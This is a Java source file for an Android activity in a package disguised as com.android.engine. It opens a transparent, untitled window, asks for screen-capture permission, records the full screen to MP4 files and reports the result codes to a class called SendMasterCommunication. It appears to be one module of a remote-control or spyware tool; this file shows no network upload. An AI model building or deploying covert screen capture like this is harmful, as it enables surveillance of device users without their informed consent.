package com.android.engine.ui;

import android.app.Activity;
import android.content.Intent;
import android.graphics.drawable.ColorDrawable;
import android.hardware.display.DisplayManager;
import android.media.MediaCodec;
import android.media.MediaCodec.BufferInfo;
import android.media.MediaFormat;
import android.media.MediaMuxer;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.view.Surface;
import com.android.engine.SendMasterCommunication;
import com.android.engine.service.MyService;
import java.nio.ByteBuffer;
import java.util.Date;

import static android.media.MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4;
import static com.android.engine.ExceptionAction.sendExceptionAction;

public class MediaProjectionActivity extends Activity {

  private static final Handler handler;
  private static MediaProjection mediaProjection;
  private static int widthPixels;
  private static int heightPixels;
  private static int densityDpi;
  private static boolean mediaMuxerIsRunning;
  private static Surface surface;
  private static MediaMuxer mediaMuxer;
  private static MediaCodec mediaCodec;
  private static BufferInfo bufferInfo;
  private static int videoTrackIndex;
  private static Runnable startMuxingRunnable;

  private MediaProjectionManager mediaProjectionManager;

  static {
    handler = new Handler(Looper.getMainLooper());
    mediaMuxerIsRunning = false;
    videoTrackIndex = -1;
    startMuxingRunnable = new Runnable() {
      public void run() {
        try {
          MediaProjectionActivity.startMuxing();
        } catch (Exception e) {
          sendExceptionAction(e.getMessage());
        }
      }
    };
  }

  public static void clean() {
    try {
      handler.removeCallbacks(startMuxingRunnable);
      if (mediaMuxer != null) {
        if (mediaMuxerIsRunning) {
          mediaMuxer.stop();
        }
        mediaMuxer.release();
        mediaMuxer = null;
        mediaMuxerIsRunning = false;
      }

      if (mediaCodec != null) {
        mediaCodec.stop();
        mediaCodec.release();
        mediaCodec = null;
      }

      if (surface != null) {
        surface.release();
        surface = null;
      }

      if (mediaProjection != null) {
        mediaProjection.stop();
        mediaProjection = null;
      }

      bufferInfo = null;
      startMuxingRunnable = null;
      videoTrackIndex = -1;
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private static void startMuxing() {
    try {
      handler.removeCallbacks(startMuxingRunnable);
      while (true) {
        int dequeueOutputBuffer = mediaCodec.dequeueOutputBuffer(bufferInfo, 0);
        if (dequeueOutputBuffer == -1) {
          break;
        } else if (dequeueOutputBuffer == -2) {
          videoTrackIndex = mediaMuxer.addTrack(mediaCodec.getOutputFormat());

          if (!mediaMuxerIsRunning && videoTrackIndex >= 0) {
            mediaMuxer.start();
            mediaMuxerIsRunning = true;
          }
        } else if (dequeueOutputBuffer >= 0) {
          ByteBuffer outputBuffer = mediaCodec.getOutputBuffer(dequeueOutputBuffer);

          if ((bufferInfo.flags & 2) != 0) {
            bufferInfo.size = 0;
          }

          if (bufferInfo.size != 0 && mediaMuxerIsRunning) {
            outputBuffer.position(bufferInfo.offset);
            outputBuffer.limit(bufferInfo.offset + bufferInfo.size);
            mediaMuxer.writeSampleData(videoTrackIndex, outputBuffer, bufferInfo);
          }

          mediaCodec.releaseOutputBuffer(dequeueOutputBuffer, false);

          if ((bufferInfo.flags & 4) != 0) {
            break;
          }
        } else {
          continue;
        }
      }

      handler.postDelayed(startMuxingRunnable, 10);
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void startMediaCodec() {
    try {
      bufferInfo = new BufferInfo();
      MediaFormat createVideoFormat =
          MediaFormat.createVideoFormat("video/avc", widthPixels, heightPixels);
      createVideoFormat.setInteger("color-format", 2130708361);
      createVideoFormat.setInteger("bitrate", 12000000);
      createVideoFormat.setInteger("frame-rate", 30);
      createVideoFormat.setInteger("capture-rate", 30);
      createVideoFormat.setInteger("repeat-previous-frame-after", 33333);
      createVideoFormat.setInteger("channel-count", 1);
      createVideoFormat.setInteger("mediaCodec-frame-interval", 1);

      mediaCodec = MediaCodec.createEncoderByType("video/avc");
      mediaCodec.configure(createVideoFormat, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
      surface = mediaCodec.createInputSurface();
      mediaCodec.start();
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
      clean();
    }
  }

  private void createMediaMuxer() {
    try {
      if (((DisplayManager) getSystemService(DISPLAY_SERVICE)).getDisplay(0) == null) {
        throw new RuntimeException("No display found.");
      }

      startMediaCodec();

      mediaMuxer = new MediaMuxer(
          MyService.context.getExternalFilesDir(Environment.DIRECTORY_MOVIES).getCanonicalPath()
              + "/rec_"
              + new Date().toLocaleString().replace(":", "-")
              + ".mp4", MUXER_OUTPUT_MPEG_4);
      mediaProjection.createVirtualDisplay("Recording Display", widthPixels, heightPixels,
          densityDpi, 0, surface, null, null);

      startMuxing();
    } catch (Throwable e) {
      throw new RuntimeException("MediaMuxer creation failed", e);
    }
  }

  public void onActivityResult(int requestCode, int resultCode, Intent intent) {
    if (1 == requestCode) {
      if (resultCode == -1) {
        try {
          mediaProjection = this.mediaProjectionManager.getMediaProjection(resultCode, intent);
          createMediaMuxer();
          SendMasterCommunication.sendAction(108);
        } catch (Exception e) {
          sendExceptionAction(e.getMessage());
          return;
        }
      }
      SendMasterCommunication.sendAction(109);
    }
    finish();
  }

  protected void onCreate(Bundle bundle) {
    try {
      super.onCreate(bundle);
      setTitle("");
      getWindow().setBackgroundDrawable(new ColorDrawable(0));
      getWindow().clearFlags(2);

      DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
      widthPixels = displayMetrics.widthPixels;
      heightPixels = displayMetrics.heightPixels;
      densityDpi = displayMetrics.densityDpi;

      mediaProjectionManager =
          (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
      startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), 1);
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }
}
